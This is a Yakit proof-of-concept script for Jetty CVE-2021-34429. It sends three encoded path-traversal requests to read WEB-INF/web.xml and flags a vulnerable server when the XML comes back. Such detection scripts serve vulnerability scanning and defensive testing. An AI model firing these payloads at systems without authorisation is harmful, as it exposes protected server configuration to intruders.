##server:jetty
##type:poc
##params:root_url
##name:CVE_2021_34429
##severity:low
##out_put:
yakit.AutoInitYakit()
log.setLevel("info")
// 准备发送的报文模版 



Packet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}


//填充对应的漏洞检测规则
addRule(Packet,`/.%00/WEB-INF/web.xml`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `application/xml`) && str.MatchAllOfSubString(body, `</web-app>`) {
        return true
    }
    return false
},"信息泄露","jetty-cve-2021-34429","low","https://www.linuxlz.com/aqld/2309.html")

addRule(Packet,`/%u002e/WEB-INF/web.xml`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `application/xml`) && str.MatchAllOfSubString(body, `</web-app>`) {
        return true
    }
    return false
},"信息泄露","jetty-cve-2021-34429","low","https://www.linuxlz.com/aqld/2309.html")

addRule(Packet,`/a/b/..%00/WEB-INF/web.xml`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `application/xml`) && str.MatchAllOfSubString(body, `</web-app>`) {
        return true
    }
    return false
},"信息泄露","jetty-cve-2021-34429","low","https://www.linuxlz.com/aqld/2309.html")

//漏洞检测handle 
handleRule = func(isTls, addr, rule) {




        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0),)
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            // log.info(json.dumps({"url":addr,"success":true}))
            // yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return 1
        }else{
            // log.info(json.dumps({"success":false}))
            // yakit.Info("not found")
        }
        return 0

}
target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
isTls = str.IsTLSServer(addr)

for _, rule = range rules {
    if handleRule(isTls, addr, rule){
        return
    }
}
